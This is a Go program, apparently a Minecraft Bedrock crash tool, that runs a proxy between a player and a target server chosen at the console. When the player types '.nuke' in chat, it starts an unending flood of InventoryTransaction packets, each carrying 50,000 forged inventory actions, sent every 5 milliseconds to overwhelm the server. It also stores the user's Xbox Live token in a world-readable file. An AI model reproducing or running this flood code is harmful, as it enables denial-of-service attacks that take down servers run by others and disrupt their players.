package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "log"
    "os"
    "sync"
    "time"
    "errors" // Importar el paquete "errors"

    "github.com/pelletier/go-toml"
    "github.com/sandertv/gophertunnel/minecraft"
    "github.com/sandertv/gophertunnel/minecraft/auth"
    "github.com/sandertv/gophertunnel/minecraft/protocol"
    "github.com/sandertv/gophertunnel/minecraft/protocol/packet"
    "github.com/sirupsen/logrus"
    "golang.org/x/oauth2"
)

const COUNT = 50000

var addr string

func main() {
    config := readConfig()

    reader := bufio.NewReader(os.Stdin)
    fmt.Print("Ingresa la IP del servidor: ")
    ip, _ := reader.ReadString('\n')
    fmt.Print("Ingresa el puerto del servidor: ")
    port, _ := reader.ReadString('\n')

    ip = ip[:len(ip)-1]
    port = port[:len(port)-1]

    config.Connection.RemoteAddress = fmt.Sprintf("%s:%s", ip, port)

    writeConfig(config)

    src := tokenSource()

    p, err := minecraft.NewForeignStatusProvider(config.Connection.RemoteAddress)
    if err != nil {
        panic(err)
    }
    listener, err := minecraft.ListenConfig{
        StatusProvider: p,
    }.Listen("raknet", config.Connection.LocalAddress)
    if err != nil {
        panic(err)
    }

    addr = config.Connection.RemoteAddress

    defer listener.Close()
    for {
        c, err := listener.Accept()
        if err != nil {
            panic(err)
        }
        go handleConn(c.(*minecraft.Conn), listener, config, src)
    }
}

func handleConn(conn *minecraft.Conn, listener *minecraft.Listener, config config, src oauth2.TokenSource) {
    serverConn, err := minecraft.Dialer{
        TokenSource: src,
        ClientData:  conn.ClientData(),
    }.Dial("raknet", addr)
    if err != nil {
        panic(err)
    }
    var g sync.WaitGroup
    g.Add(2)
    go func() {
        if err := conn.StartGame(serverConn.GameData()); err != nil {
            panic(err)
        }
        g.Done()
    }()
    go func() {
        if err := serverConn.DoSpawn(); err != nil {
            panic(err)
        }
        g.Done()
    }()
    g.Wait()

    go func() {
        defer listener.Disconnect(conn, "connection lost")
        defer serverConn.Close()
        for {
            pk, err := conn.ReadPacket()
            if err != nil {
                return
            }
            if pk, ok := pk.(*packet.Text); ok {
                if pk.Message == ".nuke" {
                    go func() {
                        for {
                            actions := make([]protocol.InventoryAction, COUNT)
                            for i := range actions {
                                newAction := actions[i]
                                newAction.InventorySlot = 28
                                newAction.SourceType = protocol.InventoryActionSourceContainer
                                newAction.WindowID = protocol.WindowIDInventory
                                newAction.NewItem = protocol.ItemInstance{
                                    StackNetworkID: 0,
                                    Stack: protocol.ItemStack{
                                        ItemType: protocol.ItemType{
                                            NetworkID: 0,
                                        },
                                        BlockRuntimeID: 0,
                                        Count:          32,
                                        HasNetworkID:   true,
                                    },
                                }
                                newAction.OldItem = protocol.ItemInstance{
                                    StackNetworkID: 2,
                                    Stack: protocol.ItemStack{
                                        ItemType: protocol.ItemType{
                                            NetworkID: 2,
                                        },
                                        BlockRuntimeID: 2,
                                        Count:          2,
                                        HasNetworkID:   true,
                                    },
                                }

                                actions[i] = newAction
                            }
                            serverConn.WritePacket(&packet.InventoryTransaction{
                                Actions:         actions,
                                TransactionData: &protocol.NormalTransactionData{},
                            })
                            logrus.Infof("Sending %d modified payloads to the server!", COUNT)
                            time.Sleep(5 * time.Millisecond)
                        }
                    }()
                }
            }
            if err := serverConn.WritePacket(pk); err != nil {
                if disconnect, ok := errors.Unwrap(err).(minecraft.DisconnectError); ok {
                    _ = listener.Disconnect(conn, disconnect.Error())
                }
                return
            }
        }
    }()
    go func() {
        defer serverConn.Close()
        defer listener.Disconnect(conn, "connection lost")
        for {
            pk, err := serverConn.ReadPacket()
            if pk, ok := pk.(*packet.Transfer); ok {
                addr = fmt.Sprintf("%s:%d", pk.Address, pk.Port)

                pk.Address = "127.0.0.1"
                pk.Port = 19132
            }
            if err != nil {
                if disconnect, ok := errors.Unwrap(err).(minecraft.DisconnectError); ok {
                    _ = listener.Disconnect(conn, disconnect.Error())
                }
                return
            }
            if err := conn.WritePacket(pk); err != nil {
                return
            }
        }
    }()
}

type config struct {
    Connection struct {
        LocalAddress  string
        RemoteAddress string
    }
}

func readConfig() config {
    c := config{}
    if _, err := os.Stat("config.toml"); os.IsNotExist(err) {
        f, err := os.Create("config.toml")
        if err != nil {
            log.Fatalf("error creating config: %v", err)
        }
        data, err := toml.Marshal(c)
        if err != nil {
            log.Fatalf("error encoding default config: %v", err)
        }
        if _, err := f.Write(data); err != nil {
            log.Fatalf("error writing encoded default config: %v", err)
        }
        _ = f.Close()
    }
    data, err := os.ReadFile("config.toml")
    if err != nil {
        log.Fatalf("error reading config: %v", err)
    }
    if err := toml.Unmarshal(data, &c); err != nil {
        log.Fatalf("error decoding config: %v", err)
    }
    if c.Connection.LocalAddress == "" {
        c.Connection.LocalAddress = "0.0.0.0:19132"
    }
    data, _ = toml.Marshal(c)
    if err := os.WriteFile("config.toml", data, 0644); err != nil {
        log.Fatalf("error writing config file: %v", err)
    }
    return c
}

func writeConfig(config config) {
    data, err := toml.Marshal(config)
    if err != nil {
        log.Fatalf("error marshaling config: %v", err)
    }
    err = ioutil.WriteFile("config.toml", data, 0644)
    if err != nil {
        log.Fatalf("error writing config file: %v", err)
    }
}

func tokenSource() oauth2.TokenSource {
    check := func(err error) {
        if err != nil {
            panic(err)
        }
    }
    token := new(oauth2.Token)
    tokenData, err := ioutil.ReadFile("token.tok")
    if err == nil {
        _ = json.Unmarshal(tokenData, token)
    } else {
        token, err = auth.RequestLiveToken()
        check(err)
    }
    src := auth.RefreshTokenSource(token)
    _, err = src.Token()
    if err != nil {
        token, err = auth.RequestLiveToken()
        check(err)
        src = auth.RefreshTokenSource(token)
    }
    tok, _ := src.Token()
    b, _ := json.Marshal(tok)
    _ = ioutil.WriteFile("token.tok", b, 0644)
    return src
}
